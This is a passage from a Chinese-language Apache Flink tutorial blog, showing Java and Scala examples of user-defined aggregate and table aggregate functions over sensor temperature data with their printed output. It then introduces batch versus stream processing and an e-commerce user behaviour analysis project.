class="meta">result&gt;</span><span class="bash"> sensor_6,1547718201,sensor,6</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_6,1547718201,6,1</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_6,1547718201,sensor,6</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_6,1547718201,6,1</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_7,1547718202,sensor,6</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_7,1547718202,7,1</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_7,1547718202,sensor,6</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_7,1547718202,7,1</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_10,1547718205,sensor,6</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_10,1547718205,10,2</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_10,1547718205,sensor,6</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_10,1547718205,10,2</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,1547718207,sensor,6</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,1547718207,1,1</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_1,1547718207,sensor,6</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_1,1547718207,1,1</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,1547718209,sensor,6</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,1547718209,1,1</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_1,1547718209,sensor,6</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_1,1547718209,1,1</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,1547718212,sensor,6</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> sensor_1,1547718212,1,1</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_1,1547718212,sensor,6</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> sensor_1,1547718212,1,1</span></span><br></pre></td></tr></table></figure><h5 id="聚合函数-Aggregate-Functions"><a href="#聚合函数-Aggregate-Functions" class="headerlink" title="聚合函数(Aggregate Functions)"></a>聚合函数(Aggregate Functions)</h5><p><strong>聚合，多对一，类似前面的窗口聚合</strong></p><hr><ul><li>用户自定义聚合函数（User-Defined Aggregate Functions，UDAGGs）可以把一个表中的数据，聚合成一个标量值</li><li>用户定义的聚合函数，是通过继承 AggregateFunction 抽象类实现的</li></ul><p><img src="https://img-blog.csdnimg.cn/20200601221643915.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=JJ5Ld&originHeight=335&originWidth=635&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>AggregationFunction要求必须实现的方法 <ul><li><code>createAccumulator()</code></li><li><code>accumulate()</code></li><li><code>getValue()</code></li></ul></li><li>AggregateFunction 的工作原理如下： <ul><li>首先，它需要一个累加器（Accumulator），用来保存聚合中间结果的数据结构；可以通过调用 <code>createAccumulator()</code> 方法创建空累加器</li><li>随后，对每个输入行调用函数的 <code>accumulate()</code> 方法来更新累加器</li><li>处理完所有行后，将调用函数的 <code>getValue()</code> 方法来计算并返回最终结果</li></ul></li></ul><h6 id="测试代码-13"><a href="#测试代码-13" class="headerlink" title="测试代码"></a>测试代码</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> apitest.tableapi.udf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> apitest.beans.SensorReading;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.api.java.tuple.Tuple2;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.datastream.DataStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.environment.StreamExecutionEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.Table;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.bridge.java.StreamTableEnvironment;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.functions.AggregateFunction;</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.types.Row;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> : Ashiamd email: ashiamd@foxmail.com</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> : 2021/2/4 4:24 AM</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UdfTest3_AggregateFunction</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    StreamExecutionEnvironment env = StreamExecutionEnvironment.getExecutionEnvironment();</span><br><span class="line">    env.setParallelism(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    StreamTableEnvironment tableEnv = StreamTableEnvironment.create(env);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. 读取数据</span></span><br><span class="line">    DataStream&lt;String&gt; inputStream = env.readTextFile(<span class="string">&quot;/tmp/Flink_Tutorial/src/main/resources/sensor.txt&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2. 转换成POJO</span></span><br><span class="line">    DataStream&lt;SensorReading&gt; dataStream = inputStream.map(line -&gt; &#123;</span><br><span class="line">      String[] fields = line.split(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> SensorReading(fields[<span class="number">0</span>], <span class="keyword">new</span> Long(fields[<span class="number">1</span>]), <span class="keyword">new</span> Double(fields[<span class="number">2</span>]));</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3. 将流转换成表</span></span><br><span class="line">    Table sensorTable = tableEnv.fromDataStream(dataStream, <span class="string">&quot;id, timestamp as ts, temperature as temp&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4. 自定义聚合函数，求当前传感器的平均温度值</span></span><br><span class="line">    <span class="comment">// 4.1 table API</span></span><br><span class="line">    AvgTemp avgTemp = <span class="keyword">new</span> AvgTemp();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 需要在环境中注册UDF</span></span><br><span class="line">    tableEnv.registerFunction(<span class="string">&quot;avgTemp&quot;</span>, avgTemp);</span><br><span class="line">    Table resultTable = sensorTable</span><br><span class="line">      .groupBy(<span class="string">&quot;id&quot;</span>)</span><br><span class="line">      .aggregate(<span class="string">&quot;avgTemp(temp) as avgtemp&quot;</span>)</span><br><span class="line">      .select(<span class="string">&quot;id, avgtemp&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4.2 SQL</span></span><br><span class="line">    tableEnv.createTemporaryView(<span class="string">&quot;sensor&quot;</span>, sensorTable);</span><br><span class="line">    Table resultSqlTable = tableEnv.sqlQuery(<span class="string">&quot;select id, avgTemp(temp) &quot;</span> +</span><br><span class="line">                                             <span class="string">&quot; from sensor group by id&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打印输出</span></span><br><span class="line">    tableEnv.toRetractStream(resultTable, Row.class).print(<span class="string">&quot;result&quot;</span>);</span><br><span class="line">    tableEnv.toRetractStream(resultSqlTable, Row.class).print(<span class="string">&quot;sql&quot;</span>);</span><br><span class="line"></span><br><span class="line">    env.execute();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现自定义的AggregateFunction</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">AvgTemp</span> <span class="keyword">extends</span> <span class="title">AggregateFunction</span>&lt;<span class="title">Double</span>, <span class="title">Tuple2</span>&lt;<span class="title">Double</span>, <span class="title">Integer</span>&gt;&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Double <span class="title">getValue</span><span class="params">(Tuple2&lt;Double, Integer&gt; accumulator)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> accumulator.f0 / accumulator.f1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Tuple2&lt;Double, Integer&gt; <span class="title">createAccumulator</span><span class="params">()</span> </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> Tuple2&lt;&gt;(<span class="number">0.0</span>, <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 必须实现一个accumulate方法，来数据之后更新状态</span></span><br><span class="line">    <span class="comment">// 这里方法名必须是这个，且必须public。</span></span><br><span class="line">    <span class="comment">// 累加器参数，必须得是第一个参数；随后的才是我们自己传的入参</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">accumulate</span><span class="params">(Tuple2&lt;Double, Integer&gt; accumulator, Double temp)</span> </span>&#123;</span><br><span class="line">      accumulator.f0 += temp;</span><br><span class="line">      accumulator.f1 += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">result&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,35.8)</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_6,15.4)</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_7,6.7)</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_10,38.1)</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> (<span class="literal">false</span>,sensor_1,35.8)</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,36.05)</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,35.8)</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> (<span class="literal">false</span>,sensor_1,36.05)</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_6,15.4)</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,34.96666666666666)</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_7,6.7)</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> (<span class="literal">false</span>,sensor_1,34.96666666666666)</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_10,38.1)</span></span><br><span class="line"><span class="meta">result&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,35.5)</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">false</span>,sensor_1,35.8)</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,36.05)</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">false</span>,sensor_1,36.05)</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,34.96666666666666)</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">false</span>,sensor_1,34.96666666666666)</span></span><br><span class="line"><span class="meta">sql&gt;</span><span class="bash"> (<span class="literal">true</span>,sensor_1,35.5)</span></span><br></pre></td></tr></table></figure><h5 id="表聚合函数"><a href="#表聚合函数" class="headerlink" title="表聚合函数"></a>表聚合函数</h5><ul><li>用户定义的表聚合函数（User-Defined Table Aggregate Functions，UDTAGGs），可以把一个表中数据，聚合为具有多行和多列的结果表</li><li>用户定义表聚合函数，是通过继承 TableAggregateFunction 抽象类来实现的</li></ul><p><img src="https://img-blog.csdnimg.cn/20200601223517314.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=wte81&originHeight=325&originWidth=635&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>AggregationFunction 要求必须实现的方法： <ul><li><code>createAccumulator()</code></li><li><code>accumulate()</code></li><li><code>emitValue()</code></li></ul></li><li>TableAggregateFunction 的工作原理如下： <ul><li>首先，它同样需要一个累加器（Accumulator），它是保存聚合中间结果的数据结构。通过调用 <code>createAccumulator()</code> 方法可以创建空累加器。</li><li>随后，对每个输入行调用函数的 <code>accumulate()</code> 方法来更新累加器。</li><li>处理完所有行后，将调用函数的 <code>emitValue()</code> 方法来计算并返回最终结果。</li></ul></li></ul><h6 id="测试代码-14"><a href="#测试代码-14" class="headerlink" title="测试代码"></a>测试代码</h6><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106482550">Flink-函数 | 用户自定义函数（UDF）标量函数 | 表函数 | 聚合函数 | 表聚合函数</a></p></blockquote><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.atguigu.bean.<span class="type">SensorReading</span></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.<span class="type">TimeCharacteristic</span></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.functions.timestamps.<span class="type">BoundedOutOfOrdernessTimestampExtractor</span></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.scala._</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.streaming.api.windowing.time.<span class="type">Time</span></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.<span class="type">Table</span></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.api.scala._</span><br><span class="line"><span class="keyword">import</span> org.apache.flink.table.functions.<span class="type">TableAggregateFunction</span></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.types.<span class="type">Row</span></span><br><span class="line"><span class="keyword">import</span> org.apache.flink.util.<span class="type">Collector</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">object</span> <span class="title">TableAggregateFunctionTest</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">main</span></span>(args: <span class="type">Array</span>[<span class="type">String</span>]): <span class="type">Unit</span> = &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">val</span> env: <span class="type">StreamExecutionEnvironment</span> = <span class="type">StreamExecutionEnvironment</span>.getExecutionEnvironment</span><br><span class="line">    env.setParallelism(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 开启事件时间语义</span></span><br><span class="line">    env.setStreamTimeCharacteristic(<span class="type">TimeCharacteristic</span>.<span class="type">EventTime</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建表环境</span></span><br><span class="line">    <span class="keyword">val</span> tableEnv: <span class="type">StreamTableEnvironment</span> = <span class="type">StreamTableEnvironment</span>.create(env)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">val</span> inputDStream: <span class="type">DataStream</span>[<span class="type">String</span>] = env.readTextFile(<span class="string">&quot;D:\\MyWork\\WorkSpaceIDEA\\flink-tutorial\\src\\main\\resources\\SensorReading.txt&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">val</span> dataDStream: <span class="type">DataStream</span>[<span class="type">SensorReading</span>] = inputDStream.map(</span><br><span class="line">      data =&gt; &#123;</span><br><span class="line">        <span class="keyword">val</span> dataArray: <span class="type">Array</span>[<span class="type">String</span>] = data.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">        <span class="type">SensorReading</span>(dataArray(<span class="number">0</span>), dataArray(<span class="number">1</span>).toLong, dataArray(<span class="number">2</span>).toDouble)</span><br><span class="line">      &#125;)</span><br><span class="line">    .assignTimestampsAndWatermarks( <span class="keyword">new</span> <span class="type">BoundedOutOfOrdernessTimestampExtractor</span>[<span class="type">SensorReading</span>]</span><br><span class="line">                                   ( <span class="type">Time</span>.seconds(<span class="number">1</span>) ) &#123;</span><br><span class="line">                                     <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">extractTimestamp</span></span>(element: <span class="type">SensorReading</span>): <span class="type">Long</span> = element.timestamp * <span class="number">1000</span>L</span><br><span class="line">                                   &#125; )</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用proctime定义处理时间</span></span><br><span class="line">    <span class="keyword">val</span> dataTable: <span class="type">Table</span> = tableEnv</span><br><span class="line">    .fromDataStream(dataDStream, <span class="symbol">&#x27;id</span>, <span class="symbol">&#x27;temperature</span>, <span class="symbol">&#x27;timestamp</span>.rowtime as <span class="symbol">&#x27;ts</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用自定义的hash函数，求id的哈希值</span></span><br><span class="line">    <span class="keyword">val</span> myAggTabTemp = <span class="type">MyAggTabTemp</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查询 Table API 方式</span></span><br><span class="line">    <span class="keyword">val</span> resultTable: <span class="type">Table</span> = dataTable</span><br><span class="line">    .groupBy(<span class="symbol">&#x27;id</span>)</span><br><span class="line">    .flatAggregate( myAggTabTemp(<span class="symbol">&#x27;temperature</span>) as (<span class="symbol">&#x27;temp</span>, <span class="symbol">&#x27;rank</span>) )</span><br><span class="line">    .select(<span class="symbol">&#x27;id</span>, <span class="symbol">&#x27;temp</span>, <span class="symbol">&#x27;rank</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// SQL调用方式，首先要注册表</span></span><br><span class="line">    tableEnv.createTemporaryView(<span class="string">&quot;dataTable&quot;</span>, dataTable)</span><br><span class="line">    <span class="comment">// 注册函数</span></span><br><span class="line">    tableEnv.registerFunction(<span class="string">&quot;myAggTabTemp&quot;</span>, myAggTabTemp)</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    val resultSqlTable: Table = tableEnv.sqlQuery(</span></span><br><span class="line"><span class="comment">      &quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">        |select id, temp, `rank`</span></span><br><span class="line"><span class="comment">        |from dataTable, lateral table(myAggTabTemp(temperature)) as aggtab(temp, `rank`)</span></span><br><span class="line"><span class="comment">        |group by id</span></span><br><span class="line"><span class="comment">        |&quot;&quot;&quot;.stripMargin)</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 测试输出</span></span><br><span class="line">    resultTable.toRetractStream[ <span class="type">Row</span> ].print( <span class="string">&quot;scalar&quot;</span> )</span><br><span class="line">    <span class="comment">//resultSqlTable.toAppendStream[ Row ].print( &quot;scalar_sql&quot; )</span></span><br><span class="line">    <span class="comment">// 查看表结构</span></span><br><span class="line">    dataTable.printSchema()</span><br><span class="line"></span><br><span class="line">    env.execute(<span class="string">&quot; table ProcessingTime test job&quot;</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义状态类</span></span><br><span class="line"><span class="keyword">case</span> <span class="class"><span class="keyword">class</span> <span class="title">AggTabTempAcc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> highestTemp: <span class="type">Double</span> = <span class="type">Double</span>.<span class="type">MinValue</span></span><br><span class="line">  <span class="keyword">var</span> secondHighestTemp: <span class="type">Double</span> = <span class="type">Double</span>.<span class="type">MinValue</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="class"><span class="keyword">class</span> <span class="title">MyAggTabTemp</span>(<span class="params"></span>) <span class="keyword">extends</span> <span class="title">TableAggregateFunction</span>[(<span class="type">Double</span>, <span class="type">Int</span>), <span class="type">AggTabTempAcc</span>]</span>&#123;</span><br><span class="line">  <span class="comment">// 初始化状态</span></span><br><span class="line">  <span class="keyword">override</span> <span class="function"><span class="keyword">def</span> <span class="title">createAccumulator</span></span>(): <span class="type">AggTabTempAcc</span> = <span class="keyword">new</span> <span class="type">AggTabTempAcc</span>()</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 每来一个数据后，聚合计算的操作</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">accumulate</span></span>( acc: <span class="type">AggTabTempAcc</span>, temp: <span class="type">Double</span> ): <span class="type">Unit</span> =&#123;</span><br><span class="line">    <span class="comment">// 将当前温度值，跟状态中的最高温和第二高温比较，如果大的话就替换</span></span><br><span class="line">    <span class="keyword">if</span>( temp &gt; acc.highestTemp )&#123;</span><br><span class="line">      <span class="comment">// 如果比最高温还高，就排第一，其它温度依次后移</span></span><br><span class="line">      acc.secondHighestTemp = acc.highestTemp</span><br><span class="line">      acc.highestTemp = temp</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>( temp &gt; acc.secondHighestTemp )&#123;</span><br><span class="line">      acc.secondHighestTemp = temp</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 实现一个输出数据的方法，写入结果表中</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">emitValue</span></span>( acc: <span class="type">AggTabTempAcc</span>, out: <span class="type">Collector</span>[(<span class="type">Double</span>, <span class="type">Int</span>)] ): <span class="type">Unit</span> =&#123;</span><br><span class="line">    out.collect((acc.highestTemp, <span class="number">1</span>))</span><br><span class="line">    out.collect((acc.secondHighestTemp, <span class="number">2</span>))</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="基于flink的电商用户行为数据分析"><a href="#基于flink的电商用户行为数据分析" class="headerlink" title="基于flink的电商用户行为数据分析"></a>基于flink的电商用户行为数据分析</h3><blockquote><p><a href="https://blog.csdn.net/qq_40180229/article/details/106502286">Flink电商项目第一天-电商用户行为分析及完整图步骤解析-热门商品统计TopN的实现</a></p></blockquote><ul><li>批处理和流处理</li><li>电商用户行为分析</li><li>数据源解析</li><li>项目模块划分</li></ul><h4 id="批处理和流处理"><a href="#批处理和流处理" class="headerlink" title="批处理和流处理"></a>批处理和流处理</h4><h5 id="批处理"><a href="#批处理" class="headerlink" title="批处理"></a>批处理</h5><p>批处理主要操作大容量静态数据集，并在计算过程完成后返回结果。</p><p>可以认为，处理的是用一个固定时间间隔分组的数据点集合。</p><p>批处理模式中使用的数据集通常符合下列特征：</p><ul><li><strong>有界：批处理数据集代表数据的有限集合</strong></li><li><strong>持久：数据通常始终存储在某种类型的持久存储位置中</strong></li><li><strong>大量：批处理操作通常是处理极为海量数据集的唯一方法</strong></li></ul><h5 id="流处理"><a href="#流处理" class="headerlink" title="流处理"></a>流处理</h5><p>流处理可以对随时进入系统的数据进行计算。</p><p>流处理方式无需针对整个数据集执行操作，而是对通过系统传输的每个数据项执行操作。</p><p>流处理中的数据集是“无边界”的，这就产生了几个重要的影响：</p><ul><li> 可以处理几乎无限量的数据，但<strong>同一时间只能处理一条数据，不同记录间只维持最少量的状态</strong> </li><li> 处理工作是基于事件的，除非明确停止否则没有“尽头” </li><li> 处理结果立刻可用，并会随着新数据的抵达继续更新。 </li></ul><h4 id="电商用户行为分析"><a href="#电商用户行为分析" class="headerlink" title="电商用户行为分析"></a>电商用户行为分析</h4><p><img src="https://img-blog.csdnimg.cn/20200602182834724.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=OyIZz&originHeight=392&originWidth=670&originalType=binary&ratio=1&status=done&style=none"></p><ul><li>统计分析 <ul><li>点击、浏览</li><li>热门商品、近期热门商品、分类热门商品，流量统计</li></ul></li><li>偏好统计 <ul><li>收藏、喜欢、评分、打标签</li><li>用户画像，推荐列表（结合特征工程和机器学习算法）</li></ul></li><li>风险控制 <ul><li>下订单、支付、登录</li><li>刷单监控，订单失效监控，恶意登录（短时间内频繁登录失败）监控</li></ul></li></ul><h5 id="项目模块设计"><a href="#项目模块设计" class="headerlink" title="项目模块设计"></a>项目模块设计</h5><p><img src="https://img-blog.csdnimg.cn/20200602183018421.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwMTgwMjI5,size_16,color_FFFFFF,t_70###id=f5fmX&originHeight=492&originWidth=721&originalType=binary&ratio=1&status=done&style=none"></p><p><img 